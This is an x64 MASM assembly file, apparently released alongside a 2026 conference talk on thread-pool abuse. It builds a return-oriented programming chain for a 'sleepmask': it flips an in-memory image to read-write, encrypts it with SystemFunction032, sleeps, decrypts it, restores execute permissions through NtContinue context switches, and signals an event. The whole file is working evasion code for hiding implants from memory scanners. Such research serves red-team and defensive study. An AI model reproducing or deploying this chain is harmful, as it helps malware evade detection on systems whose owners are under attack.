; Author: Dimitri Di Cristofaro (GlenX) - @d_glenx
; This code is part of the talk "Squat The PoolParty" made at BEACON 2026
; https://github.com/SECFORCE/Squat-The-PoolParty
; 
;
; ROP Chain to support a sleepmask behaviour
; VirtualProtect(RW) -> Encrypt -> Sleep -> Decrypt -> VirtualProtect(RX) -> SetEvent()

; Function prototype:
; VOID setup_rop(PVOID dummy,struct ROPPER *params)
; RDX = ROPPER struct
; 


option casemap:none


;   ------------------------------------------------------------------------------------
;   Utility structure to pass all the relevant details from C to ASM 
;   ------------------------------------------------------------------------------------
ROPPER STRUCT

    pSetEvent   DQ 1
    hEvent  DQ 1
    pRcxGadget  DQ 1
    addRspGadget    DQ 1
    pNtContinue DQ 1
    pCtxVirtualProtectRX    DQ 1
    pSystemFunction32   DQ 1
    pKey    DQ 1
    pPopRdxGadget   DQ 1
    pImage  DQ 1
    pSleepEx    DQ 1
    bAlertable  DQ 1
    dwMilliseconds  DQ 1
    retGadget   DQ 1
    pCtxVirtualProtectRW    DQ 1
    pCtxTrigger DQ 1
    pPopRsp DQ 1

ROPPER ENDS

.code

get_current_rsp proc
    mov rax, rsp
    add rax, 8
    ret
get_current_rsp endp


setup_rop PROC
    ; Save non-volatile registers if needed (not required in this simple setup)
     
    ; We are in the thread pool handler
    ; The paramter containing the data is the second parameter == rdx


    sub rsp, 28h
    push [rdx].ROPPER.addRspGadget


    ; --------
    ; Set Event
    ; --------
    
    push [rdx].ROPPER.pSetEvent
    push [rdx].ROPPER.hEvent
    push [rdx].ROPPER.pRcxGadget
    
    ; --------
    ; NtContinue -> VirtualProtect(RX)
    ; --------
    
    sub rsp, 28h
    push [rdx].ROPPER.addRspGadget
    
    ; Save rsp and set the value in pCtxVirtualProtectRX
    call get_current_rsp
    ; Get address of pCtxVirtualProtectRX
    mov r11, [rdx].ROPPER.pCtxVirtualProtectRX
    ; CONTEXT.Rsp is at offset 152    
    mov [r11 + 152] , rax
    
    push [rdx].ROPPER.pNtContinue
    push [rdx].ROPPER.pCtxVirtualProtectRX
    push [rdx].ROPPER.pRcxGadget
    
    ; --------
    ; SystemFunction032 - Decrypt
    ; --------
    
    sub rsp, 28h
    push [rdx].ROPPER.addRspGadget
    push [rdx].ROPPER.pSystemFunction32
    push [rdx].ROPPER.pKey
    push [rdx].ROPPER.pPopRdxGadget
    push [rdx].ROPPER.pImage
    push [rdx].ROPPER.pRcxGadget
    
    ; --------
    ; SleepEx
    ; --------
    
    sub rsp, 28h
    push [rdx].ROPPER.addRspGadget
    push [rdx].ROPPER.pSleepEx
    push [rdx].ROPPER.bAlertable
    push [rdx].ROPPER.pPopRdxGadget
    push [rdx].ROPPER.dwMilliseconds
    push [rdx].ROPPER.pRcxGadget
    ;push [rdx].ROPPER.retGadget


    ; --------
    ; SystemFunction032 - Encrypt
    ; --------
    
    ;push [rdx].ROPPER.retGadget
    sub rsp, 28h    
    push [rdx].ROPPER.addRspGadget
    push [rdx].ROPPER.pSystemFunction32
    push [rdx].ROPPER.pKey
    push [rdx].ROPPER.pPopRdxGadget
    push [rdx].ROPPER.pImage
    push [rdx].ROPPER.pRcxGadget

    ; --------
    ; NtContinue -> VirtualProtect(RW)
    ; --------
    
    sub rsp, 28h
    push [rdx].ROPPER.addRspGadget

    ; Save rsp and set the value in pCtxVirtualProtectRW
    call get_current_rsp
    ; Get address of pCtxVirtualProtectRW
    mov r11, [rdx].ROPPER.pCtxVirtualProtectRW
    ; CONTEXT.Rsp is at offset 152    
    mov [r11 + 152] , rax

    push [rdx].ROPPER.pNtContinue
    push [rdx].ROPPER.pCtxVirtualProtectRW

    ; Run NtContinue to trigger the execution
    ; Set ctxTrigger.Rsp
    ; Save rsp and set the value in pCtxTrigger
    call get_current_rsp
    ; Get address of pCtxTrigger
    mov r11, [rdx].ROPPER.pCtxTrigger
    ; CONTEXT.Rsp is at offset 152    
    mov [r11 + 98h] , rax



    


    ; NtContinue(pCtxTrigger, 0)
    mov rax, rdx
    mov rcx, [rax].ROPPER.pCtxTrigger
    ;mov rdx, 0
    call [rax].ROPPER.pNtContinue
    
    add rsp, 28h
    ret

setup_rop ENDP

END